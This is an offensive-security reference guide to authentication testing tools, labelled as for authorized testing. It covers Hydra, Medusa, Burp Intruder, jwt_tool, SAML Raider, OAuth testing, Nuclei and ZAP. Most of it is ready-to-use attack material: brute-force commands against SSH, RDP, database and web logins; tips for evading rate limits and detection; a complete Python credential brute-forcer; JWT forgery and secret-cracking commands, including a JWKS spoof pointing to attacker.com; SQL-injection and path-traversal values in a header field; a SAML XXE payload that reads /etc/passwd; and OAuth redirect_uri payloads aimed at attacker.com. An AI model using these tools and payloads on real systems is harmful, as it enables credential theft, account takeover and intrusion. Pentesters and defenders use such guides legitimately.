# Authentication Testing Tools - Comprehensive Guide

## Overview
This document provides detailed installation, configuration, and usage guides for authentication security testing tools. All tools are intended for authorized security testing only.

---

## Part 1: Brute Force Testing Tools

### 1.1 Hydra (THC-Hydra)

#### Description
Hydra is the fastest and most flexible online password cracking tool, supporting over 50 protocols including HTTP, FTP, SSH, SMTP, MySQL, and many more.

#### Installation

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install hydra -y

# Fedora/RHEL
sudo dnf install hydra -y

# Arch Linux
sudo pacman -S hydra

# From Source (Latest)
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra
./configure
make
sudo make install

# macOS (Homebrew)
brew install hydra

# Docker
docker pull vanhauser/hydra
docker run -it vanhauser/hydra -h
```

#### Basic Usage Patterns

```bash
# HTTP POST Form Brute Force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials" -V

# HTTP Basic Auth
hydra -l admin -P passwords.txt target.com http-get /admin

# HTTP Digest Auth
hydra -l admin -P passwords.txt target.com http-get /protected -m "Digest"

# SSH Brute Force
hydra -L users.txt -P passwords.txt ssh://target.com -t 4

# FTP Brute Force
hydra -l admin -P passwords.txt ftp://target.com

# MySQL Brute Force
hydra -l root -P passwords.txt mysql://target.com

# SMTP Brute Force
hydra -l user@target.com -P passwords.txt smtp://mail.target.com

# RDP Brute Force (Windows)
hydra -l administrator -P passwords.txt rdp://target.com

# LDAP Brute Force
hydra -l cn=admin,dc=target,dc=com -P passwords.txt ldap://target.com
```

#### Advanced HTTP Form Configuration

```bash
# Complex POST Form with CSRF Token
# First capture the token, then use it
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:csrf_token=TOKEN&user=^USER^&pass=^PASS^:H=Cookie: session=abc123:F=Invalid" \
  -V -I

# JSON API Authentication
hydra -l admin -P passwords.txt target.com http-post-form \
  "/api/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:F=unauthorized" \
  -V

# Multiple Failure Conditions
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:S=Welcome:F=Invalid:F=Error" -V
```

#### Key Flags

| Flag | Description |
|------|-------------|
| `-l LOGIN` | Use LOGIN as single username |
| `-L FILE` | Load usernames from FILE |
| `-p PASS` | Use PASS as single password |
| `-P FILE` | Load passwords from FILE |
| `-C FILE` | Colon-separated user:pass file |
| `-t TASKS` | Parallel connections (default 16) |
| `-w TIME` | Wait time between attempts |
| `-f` | Exit after first valid pair found |
| `-V` | Verbose mode, show each attempt |
| `-I` | Ignore previous restore file |
| `-e nsr` | Try null password, login as pass, reversed login |
| `-o FILE` | Write results to FILE |
| `-M FILE` | Attack multiple targets from FILE |

#### Bypassing Rate Limits

```bash
# Slow down attacks
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" -w 3 -W 5 -t 1

# Use proxy rotation (with proxychains)
proxychains hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

---

### 1.2 Medusa

#### Description
Medusa is a speedy, massively parallel, modular login brute-forcer supporting many services.

#### Installation

```bash
# Debian/Ubuntu
sudo apt install medusa -y

# From Source
git clone https://github.com/jmk-foofus/medusa.git
cd medusa
./configure
make
sudo make install
```

#### Usage Examples

```bash
# HTTP Form POST
medusa -h target.com -u admin -P passwords.txt -M http \
  -m FORM:"/login:username=&password=" -m FORM-DATA:"post?username=&password=" \
  -m DENY-SIGNAL:"Invalid" -t 4

# SSH Attack
medusa -h target.com -u root -P passwords.txt -M ssh -t 2

# FTP Attack
medusa -h target.com -U users.txt -P passwords.txt -M ftp -t 4

# MySQL Attack
medusa -h target.com -u root -P passwords.txt -M mysql -t 2

# Multiple Hosts
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -t 2

# Web Form (Basic)
medusa -h target.com -u admin -P passwords.txt -M web-form \
  -m FORM:"login.php" -m FORM-DATA:"username=&password=" -m DENY-SIGNAL:"failed"
```

#### Key Flags

| Flag | Description |
|------|-------------|
| `-h HOST` | Target hostname or IP |
| `-H FILE` | File of target hosts |
| `-u USER` | Single username |
| `-U FILE` | File of usernames |
| `-p PASS` | Single password |
| `-P FILE` | File of passwords |
| `-C FILE` | Combo file (user:pass) |
| `-M MODULE` | Module to use (ssh, http, ftp, etc.) |
| `-m PARAM` | Module-specific parameter |
| `-t TASKS` | Number of parallel logins |
| `-T TASKS` | Total parallel hosts |
| `-f` | Stop scanning after first success |
| `-v LEVEL` | Verbosity level (0-6) |

---

### 1.3 Burp Suite Intruder

#### Description
Burp Intruder is a powerful tool for automated customized attacks against web applications.

#### Configuration Workflow

1. **Capture Request**: Intercept login request in Proxy
2. **Send to Intruder**: Right-click > "Send to Intruder"
3. **Configure Positions**: Mark injection points with section marks
4. **Select Attack Type**: Choose appropriate attack mode
5. **Configure Payloads**: Load wordlists or generate payloads
6. **Configure Options**: Set threading, grep matches, redirects
7. **Start Attack**: Click "Start Attack"

#### Attack Types

| Type | Description | Use Case |
|------|-------------|----------|
| **Sniper** | Single payload set, one position at a time | Testing one parameter |
| **Battering Ram** | Same payload in all positions simultaneously | Same value needed everywhere |
| **Pitchfork** | Multiple payload sets in parallel (1:1 mapping) | Username:password pairs |
| **Cluster Bomb** | All combinations of multiple payload sets | Try all user/pass combos |

#### Example: HTTP Form Brute Force

```
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=§admin§&password=§password§
```

**Sniper Settings:**
- Position: `§admin§` and `§password§`
- Payload Set 1: Usernames wordlist
- Payload Set 2: Passwords wordlist

**Grep - Match Settings:**
- Add: "Invalid password"
- Add: "Login successful"
- Add: "Welcome"

**Resource Pool Settings:**
- Concurrent requests: 10-50 (adjust based on target)
- Delay between requests: 100-500ms (to avoid detection)

#### Handling CSRF Tokens

1. **Macro Configuration:**
   - Go to Project options > Sessions
   - Add Session Handling Rule
   - Add Macro to fetch CSRF token
   - Define macro: GET /login → Extract token from response

2. **Configure Token Extraction:**
   - Define extraction regex
   - Set parameter name for token

3. **Add to Intruder:**
   - Session handling rule applies automatically
   - Each request gets fresh CSRF token

#### Advanced Options

```
# Grep - Extract (for analyzing responses)
- Extract: Set-Cookie: session=(.*)
- Extract: "user_id": (\d+)
- Extract: "role": "(\w+)"

# Redirections
- Follow redirections: Always
- Process cookies in redirections: Yes

# Request Engine
- Number of threads: 5-20
- Number of retries: 3
- Pause before retry: 2000ms
```

---

### 1.4 Custom Python Brute Force Framework

#### Basic Authentication Bruteforcer

```python
#!/usr/bin/env python3
"""
Custom Authentication Brute Force Framework
For authorized security testing only
"""

import requests
import threading
import queue
import time
import argparse
from concurrent.futures import ThreadPoolExecutor
import sys

class AuthBruteforcer:
    def __init__(self, target_url, username_field, password_field,
                 failure_indicator, success_indicator=None, threads=10):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.failure_indicator = failure_indicator
        self.success_indicator = success_indicator
        self.threads = threads
        self.found = False
        self.attempts = 0
        self.lock = threading.Lock()
        self.session = requests.Session()

    def try_login(self, username, password):
        """Attempt single login"""
        if self.found:
            return None

        try:
            data = {
                self.username_field: username,
                self.password_field: password
            }

            response = self.session.post(
                self.target_url,
                data=data,
                timeout=10,
                allow_redirects=True
            )

            with self.lock:
                self.attempts += 1

            # Check for success
            if self.success_indicator:
                if self.success_indicator in response.text:
                    return (username, password, True)

            # Check for failure
            if self.failure_indicator not in response.text:
                return (username, password, True)

            return None

        except requests.exceptions.RequestException as e:
            print(f"[!] Request error: {e}")
            return None

    def bruteforce_single_user(self, username, passwords):
        """Brute force passwords for single user"""
        print(f"[*] Testing user: {username}")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for password in passwords:
                if self.found:
                    break
                futures.append(
                    executor.submit(self.try_login, username, password)
                )

            for future in futures:
                result = future.result()
                if result and result[2]:
                    self.found = True
                    print(f"\n[+] SUCCESS: {result[0]}:{result[1]}")
                    return result

        return None

    def bruteforce_all(self, usernames, passwords):
        """Brute force all username/password combinations"""
        for username in usernames:
            if self.found:
                break
            result = self.bruteforce_single_user(username, passwords)
            if result:
                return result
        return None

def load_wordlist(filepath):
    """Load wordlist from file"""
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def main():
    parser = argparse.ArgumentParser(description='Authentication Brute Forcer')
    parser.add_argument('-t', '--target', required=True, help='Target login URL')
    parser.add_argument('-u', '--user-field', default='username', help='Username field name')
    parser.add_argument('-p', '--pass-field', default='password', help='Password field name')
    parser.add_argument('-U', '--users', required=True, help='Username or wordlist file')
    parser.add_argument('-P', '--passwords', required=True, help='Password wordlist file')
    parser.add_argument('-f', '--failure', required=True, help='Failure indicator string')
    parser.add_argument('-s', '--success', help='Success indicator string')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')

    args = parser.parse_args()

    # Load wordlists
    if args.users.endswith('.txt'):
        usernames = load_wordlist(args.users)
    else:
        usernames = [args.users]

    passwords = load_wordlist(args.passwords)

    print(f"[*] Target: {args.target}")
    print(f"[*] Users: {len(usernames)}")
    print(f"[*] Passwords: {len(passwords)}")
    print(f"[*] Total combinations: {len(usernames) * len(passwords)}")

    bruteforcer = AuthBruteforcer(
        args.target,
        args.user_field,
        args.pass_field,
        args.failure,
        args.success,
        args.threads
    )

    start_time = time.time()
    result = bruteforcer.bruteforce_all(usernames, passwords)
    elapsed = time.time() - start_time

    print(f"\n[*] Completed in {elapsed:.2f} seconds")
    print(f"[*] Total attempts: {bruteforcer.attempts}")

    if result:
        print(f"[+] Valid credentials found: {result[0]}:{result[1]}")
    else:
        print("[-] No valid credentials found")

if __name__ == '__main__':
    main()
```

---

## Part 2: Token Analysis Tools

### 2.1 jwt_tool

#### Description
jwt_tool is the most comprehensive JWT (JSON Web Token) testing toolkit, supporting all common JWT attacks.

#### Installation

```bash
# Clone repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip3 install -r requirements.txt

# Make executable
chmod +x jwt_tool.py

# Create alias (optional)
echo 'alias jwt_tool="python3 /path/to/jwt_tool/jwt_tool.py"' >> ~/.bashrc

# Or install via pip
pip3 install jwt-tool
```

#### Basic Usage

```bash
# Decode and analyze token
jwt_tool <token>

# Tamper mode (interactive editing)
jwt_tool <token> -T

# Scan for vulnerabilities
jwt_tool <token> -M at

# Specific attack modes
jwt_tool <token> -X <attack_type>
```

#### Attack Modes (-X flag)

| Flag | Attack | Description |
|------|--------|-------------|
| `a` | alg:none | Attempt "none" algorithm attack |
| `n` | null signature | Try null/empty signature |
| `b` | blank password | Sign with blank password |
| `s` | spoof JWKS | Spoof JWKS via jku/x5u injection |
| `k` | key confusion | RS256 to HS256 key confusion |
| `i` | inject claims | Inject inline key via jwk/jku/x5u |

#### Attack Examples

```bash
# Algorithm None Attack
jwt_tool eyJ... -X a

# Key Confusion Attack (RS256 to HS256)
jwt_tool eyJ... -X k -pk public_key.pem

# JWKS Spoofing (requires server)
jwt_tool eyJ... -X s -ju "https://attacker.com/jwks.json"

# KID Injection - Path Traversal
jwt_tool eyJ... -I -hc kid -hv "../../dev/null" -S hs256 -p ""

# KID Injection - SQL Injection
jwt_tool eyJ... -I -hc kid -hv "' UNION SELECT 'key' --" -S hs256 -p "key"

# Crack weak secret
jwt_tool eyJ... -C -d /usr/share/wordlists/rockyou.txt

# Crack with custom wordlist
jwt_tool eyJ... -C -d jwt-secrets.txt

# Inject claims
jwt_tool eyJ... -I -pc user_id -pv 1 -pc role -pv admin
```

#### Payload Tampering

```bash
# Change algorithm
jwt_tool eyJ... -I -hc alg -hv HS256

# Modify claims
jwt_tool eyJ... -I -pc sub -pv "admin"
jwt_tool eyJ... -I -pc role -pv "administrator"
jwt_tool eyJ... -I -pc admin -pv true

# Extend expiration
jwt_tool eyJ... -I -pc exp -pv 9999999999

# Remove claims
jwt_tool eyJ... -D -dc exp
```

#### Output Options

```bash
# Save tampered tokens to file
jwt_tool eyJ... -X a -o tampered_tokens.txt

# JSON output
jwt_tool eyJ... -J

# Verbose mode
jwt_tool eyJ... -v
```

---

### 2.2 JWT Editor (Burp Extension)

#### Installation

1. Open Burp Suite
2. Go to Extender > BApp Store
3. Search for "JWT Editor"
4. Click "Install"

#### Features

- Automatic JWT detection in requests/responses
- Visual JWT editing with syntax highlighting
- Built-in attack generator
- Key management

#### Workflow

1. **View/Edit JWT**: Click on JWT in request, opens editor
2. **Modify Header/Payload**: Edit JSON directly
3. **Sign Token**: Use configured keys or attack mode
4. **Send Request**: Forward modified request

#### Attack Generation

1. Right-click JWT in editor
2. Select "Attack" menu:
   - "Embedded JWK attack"
   - "JWKS injection attack"
   - "Algorithm confusion attack"
   - "Sign with empty key"

---

### 2.3 SAML Raider (Burp Extension)

#### Installation

1. Open Burp Suite
2. Go to Extender > BApp Store
3. Search for "SAML Raider"
4. Click "Install"

#### Features

- SAML message editing
- Signature manipulation
- Certificate management
- XXE injection testing

#### Attack Workflow

1. **Intercept SAML Response**: Capture IdP response in Proxy
2. **Decode**: SAML Raider decodes Base64/URL encoding automatically
3. **Edit Assertions**: Modify user identity, roles, attributes
4. **Resign**: Sign with attacker certificate or remove signature
5. **Forward**: Send manipulated response to SP

#### Common Attacks

```xml
<!-- Change user identity -->
<saml:NameID>admin@target.com</saml:NameID>

<!-- Add admin role -->
<saml:Attribute Name="Role">
    <saml:AttributeValue>admin</saml:AttributeValue>
</saml:Attribute>

<!-- XXE Injection in SAML -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Assertion>&xxe;</saml:Assertion>

<!-- Signature Wrapping -->
<!-- Clone Assertion, modify original, keep signature on clone -->
```

---

### 2.4 OAuth Testing Tools

#### 2.4.1 Authorization Code Interception

```python
#!/usr/bin/env python3
"""OAuth Authorization Code Interceptor/Tester"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import ssl

class OAuthCallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        print("\n[+] OAuth Callback Received!")
        print(f"    Path: {parsed.path}")

        if 'code' in params:
            print(f"    Authorization Code: {params['code'][0]}")
        if 'state' in params:
            print(f"    State: {params['state'][0]}")
        if 'error' in params:
            print(f"    Error: {params['error'][0]}")

        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>Authorization code captured!</h1>')

def run_callback_server(port=8080, use_ssl=False):
    server = HTTPServer(('0.0.0.0', port), OAuthCallbackHandler)

    if use_ssl:
        server.socket = ssl.wrap_socket(
            server.socket,
            certfile='cert.pem',
            keyfile='key.pem',
            server_side=True
        )

    print(f"[*] OAuth callback server running on port {port}")
    server.serve_forever()

if __name__ == '__main__':
    run_callback_server()
```

#### 2.4.2 OAuth Security Checklist Tool

```bash
# Test redirect_uri manipulation
# Original: https://target.com/callback
# Attacks:
https://target.com/callback/../../../attacker
https://target.com/callback@attacker.com
https://target.com/callback%2F..%2F..%2Fattacker
https://attacker.com/?https://target.com/callback
https://target.com/callback?next=https://attacker.com

# Test state parameter
# Missing state check:
curl "https://auth.server/authorize?client_id=xxx&redirect_uri=xxx&response_type=code"

# Predictable state:
curl "https://auth.server/authorize?client_id=xxx&redirect_uri=xxx&response_type=code&state=123"

# Test PKCE bypass
# Downgrade to no PKCE:
curl "https://auth.server/authorize?client_id=xxx&redirect_uri=xxx&response_type=code"
# (remove code_challenge parameter)
```

---

## Part 3: Session Analysis Tools

### 3.1 Cookie Manager Extensions

#### Browser Extensions

**Chrome:**
- EditThisCookie
- Cookie Editor
- Cookie Manager

**Firefox:**
- Cookie Quick Manager
- Cookie Editor

#### Cookie Analysis Checklist

```
[✓] Cookie Flags:
    - HttpOnly: Prevents XSS cookie theft
    - Secure: HTTPS only transmission
    - SameSite: CSRF protection (Strict/Lax/None)

[✓] Cookie Content:
    - Encoding (Base64, URL encoding)
    - Serialized data (potential deserialization)
    - Predictable session IDs
    - Sensitive data exposure

[✓] Cookie Scope:
    - Domain scope (*.example.com vs example.com)
    - Path scope

[✓] Expiration:
    - Session vs persistent
    - Long expiration times
```

---

### 3.2 Burp Session Handling

#### Macro Setup for Session Maintenance

1. **Project Options > Sessions > Macros**
2. Click "Add" to create new macro
3. Select request to record (e.g., login request)
4. Configure parameters to extract from response

#### Session Handling Rule Configuration

```
Rule Actions:
1. Check session is valid
   - Issue request to validation URL
   - Check response for logged-in indicator

2. If invalid, run macro
   - Login macro re-authenticates
   - Updates session cookies

3. Update parameters from macro
   - CSRF token extraction
   - Session ID update

Scope:
- All tools or specific tools
- Target scope only
```

#### Example: CSRF Token Handling

1. Create macro: GET /form → Extract csrf_token
2. Add rule: Before each request in scope
3. Define parameter derivation: csrf_token from macro response
4. Apply to Intruder, Repeater, Scanner

---

### 3.3 Autorize (Burp Extension)

#### Description
Autorize automatically tests authorization enforcement by replaying requests with different session contexts.

#### Installation

1. Burp Extender > BApp Store
2. Search "Autorize"
3. Install

#### Configuration

1. **Set Low-Privilege Cookie:**
   - Login as low-privilege user
   - Copy session cookies
   - Paste into Autorize "Cookie" field

2. **Configure Enforcement Detectors:**
   - Add strings indicating "authorized" access
   - Add strings indicating "unauthorized" access

3. **Set Scope:**
   - Include target domain
   - Exclude logout/login URLs

#### Usage Workflow

1. Enable Autorize interception
2. Browse application as admin/high-privilege user
3. Autorize automatically replays each request with:
   - Low-privilege session
   - No session (unauthenticated)
4. Compare responses to detect authorization bypass

#### Result Interpretation

| Color | Meaning |
|-------|---------|
| Red | Potential authorization bypass (same response) |
| Orange | Uncertain (needs manual review) |
| Green | Properly enforced (different response) |

---

### 3.4 AuthMatrix (Burp Extension)

#### Description
AuthMatrix allows testing access control across multiple users and roles simultaneously.

#### Installation

1. Burp Extender > BApp Store
2. Search "AuthMatrix"
3. Install

#### Configuration

1. **Define Users/Roles:**
   - User1: admin (session cookie A)
   - User2: user (session cookie B)
   - User3: unauthenticated (no cookie)

2. **Define Resources:**
   - /admin/users - admin only
   - /api/profile - authenticated only
   - /public - all

3. **Set Expected Matrix:**
   | Resource | Admin | User | Unauth |
   |----------|-------|------|--------|
   | /admin/users | Allow | Deny | Deny |
   | /api/profile | Allow | Allow | Deny |
   | /public | Allow | Allow | Allow |

4. **Run Test:**
   - AuthMatrix tests all combinations
   - Highlights mismatches between expected and actual

---

## Part 4: Automated Scanners

### 4.1 Nuclei Authentication Templates

#### Installation

```bash
# Install Nuclei
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Or download binary
wget https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_linux_amd64.zip
unzip nuclei_linux_amd64.zip
sudo mv nuclei /usr/local/bin/

# Update templates
nuclei -ut
```

#### Authentication-Related Templates

```bash
# List auth templates
nuclei -tl | grep -i auth

# Scan with default credential templates
nuclei -u https://target.com -t default-logins/

# Scan for exposed panels
nuclei -u https://target.com -t exposed-panels/

# Scan for misconfigurations
nuclei -u https://target.com -t misconfiguration/

# Scan for CVEs related to auth
nuclei -u https://target.com -t cves/ -tags auth

# JWT related
nuclei -u https://target.com -t token-spray/ -t http/misconfiguration/
```

#### Custom Authentication Template

```yaml
id: custom-auth-bypass

info:
  name: Custom Authentication Bypass Check
  author: security-researcher
  severity: high
  tags: auth,bypass

requests:
  - method: POST
    path:
      - "{{BaseURL}}/api/login"
    headers:
      Content-Type: application/json
    body: '{"username":"admin","password":""}'
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "token"
          - "success"
        condition: or
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/admin"
    headers:
      X-Forwarded-For: 127.0.0.1
    matchers:
      - type: status
        status:
          - 200
```

#### Running Custom Templates

```bash
# Single template
nuclei -u https://target.com -t /path/to/custom-auth.yaml

# Directory of templates
nuclei -u https://target.com -t /path/to/custom-templates/

# With authentication
nuclei -u https://target.com -t auth-templates/ -H "Cookie: session=xxx"
nuclei -u https://target.com -t auth-templates/ -H "Authorization: Bearer xxx"
```

---

### 4.2 OWASP ZAP Authentication Context

#### Installation

```bash
# Debian/Ubuntu
sudo apt install zaproxy -y

# Snap
sudo snap install zaproxy --classic

# Docker
docker pull owasp/zap2docker-stable
docker run -it owasp/zap2docker-stable zap.sh

# Download from official site
# https://www.zaproxy.org/download/
```

#### Authentication Configuration

1. **Context Setup:**
   - Right-click site > "Include in Context"
   - Go to Context > Authentication

2. **Authentication Methods:**

   **Form-Based:**
   ```
   Login URL: https://target.com/login
   Login Request POST Data: username={%username%}&password={%password%}
   Username Parameter: username
   Password Parameter: password
   Logged In Indicator: Logout|Welcome|Dashboard
   Logged Out Indicator: Login|Sign in
   ```

   **JSON API:**
   ```
   Login URL: https://target.com/api/auth
   Login Request POST Data: {"username":"{%username%}","password":"{%password%}"}
   ```

   **Script-Based:**
   - Select authentication script
   - Configure script parameters

3. **User Configuration:**
   - Go to Context > Users
   - Add users with credentials
   - Enable users for scanning

4. **Session Management:**
   - Go to Context > Session Management
   - Select: Cookie-based / Header-based / Script-based
   - Configure session token name

#### Automated Scan with Authentication

```bash
# CLI with authentication
zap.sh -cmd -quickurl https://target.com \
  -quickprogress \
  -quickout report.html \
  -config auth.loginurl=https://target.com/login \
  -config auth.username=admin \
  -config auth.password=password123

# Docker with auth script
docker run -v $(pwd):/zap/wrk/:rw owasp/zap2docker-stable \
  zap-full-scan.py -t https://target.com \
  -n context.context -U admin
```

---

### 4.3 Burp Suite Active Scan Configuration

#### Authentication for Scanning

1. **Session Handling Rules:**
   - Configure macro for login
   - Apply to Scanner tool

2. **Scanner Configuration:**
   - Target > Scope > Define scope
   - Scanner > Scan configuration > Auth settings

#### Scan Configurations for Auth Testing

```
Issue Activity:
[✓] Authentication
    [✓] Broken authentication
    [✓] Session token in URL
    [✓] Password in URL
    [✓] Session fixation

[✓] Access Control
    [✓] Privilege escalation
    [✓] Directory listing
    [✓] Sensitive file disclosure

[✓] Session Management
    [✓] Cookie without HttpOnly
    [✓] Cookie without Secure flag
    [✓] Cookie scoped to parent domain
```

#### Custom Scan Checks

Create extension with custom scan checks:

```python
# Burp Extension - Custom Auth Scanner
from burp import IBurpExtender, IScannerCheck, IScanIssue

class BurpExtender(IBurpExtender, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Auth Scanner")
        callbacks.registerScannerCheck(self)

    def doPassiveScan(self, baseRequestResponse):
        issues = []
        response = baseRequestResponse.getResponse()

        # Check for auth-related issues
        if b"Set-Cookie:" in response:
            if b"HttpOnly" not in response:
                issues.append(CustomScanIssue(
                    baseRequestResponse,
                    "Cookie without HttpOnly flag"
                ))
        return issues
```

---

## Part 5: Quick Reference Commands

### Cheat Sheet

```bash
# === HYDRA ===
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -P pass.txt ssh://target.com

# === MEDUSA ===
medusa -h target.com -u admin -P pass.txt -M ssh
medusa -h target.com -u admin -P pass.txt -M http -m DIR:/admin

# === JWT_TOOL ===
jwt_tool <token>                           # Analyze token
jwt_tool <token> -T                        # Tamper mode
jwt_tool <token> -X a                      # None algorithm
jwt_tool <token> -X k -pk public.pem       # Key confusion
jwt_tool <token> -C -d wordlist.txt        # Crack secret

# === NUCLEI ===
nuclei -u https://target.com -t default-logins/
nuclei -u https://target.com -tags auth
nuclei -l targets.txt -t /path/to/auth-templates/

# === ZAP CLI ===
zap-cli quick-scan -s all https://target.com
zap-cli active-scan https://target.com
zap-cli report -o report.html -f html
```

---

## Part 6: Tool Integration Workflows

### Workflow 1: Complete Login Security Assessment

```
1. Reconnaissance
   └── Identify login endpoint
   └── Identify auth mechanism (form, API, OAuth, etc.)

2. Passive Analysis
   └── ZAP passive scan
   └── Check cookies/tokens in Browser DevTools
   └── Analyze with jwt_tool if JWT detected

3. Active Testing
   └── Configure Burp session handling
   └── Setup Autorize with low-priv user
   └── Run AuthMatrix role tests

4. Brute Force Testing
   └── Hydra for credential testing
   └── Custom script for rate limit bypass

5. Automated Scanning
   └── Nuclei default-logins templates
   └── Burp active scan with auth context
   └── ZAP authenticated scan

6. Reporting
   └── Consolidate findings
   └── Generate proof-of-concept
```

### Workflow 2: JWT Security Testing

```
1. Token Capture
   └── Intercept JWT from login response
   └── Check localStorage/sessionStorage

2. Analysis (jwt_tool)
   └── jwt_tool <token>
   └── Identify algorithm, claims, expiration

3. Attack Attempts
   └── None algorithm: jwt_tool <token> -X a
   └── Key confusion: jwt_tool <token> -X k -pk pubkey.pem
   └── Secret cracking: jwt_tool <token> -C -d wordlist.txt
   └── Claim tampering: jwt_tool <token> -I -pc role -pv admin

4. Verification
   └── Test tampered tokens against API
   └── Check authorization changes
```

### Workflow 3: OAuth Security Testing

```
1. Flow Identification
   └── Authorization Code / Implicit / Client Credentials
   └── Map all endpoints involved

2. Parameter Testing
   └── redirect_uri manipulation
   └── state parameter presence/validation
   └── PKCE implementation

3. Token Analysis
   └── Access token format (JWT vs opaque)
   └── Refresh token handling
   └── Token storage location

4. Authorization Testing
   └── Scope validation
   └── Token reuse across clients
   └── Privilege escalation via scope
```

---

## References

- OWASP Testing Guide - Authentication Testing
- PortSwigger Web Security Academy - Authentication
- HackTricks - Authentication Bypass
- PayloadsAllTheThings - Authentication
- jwt.io - JWT Debugger
- oauth.net - OAuth 2.0 Specifications
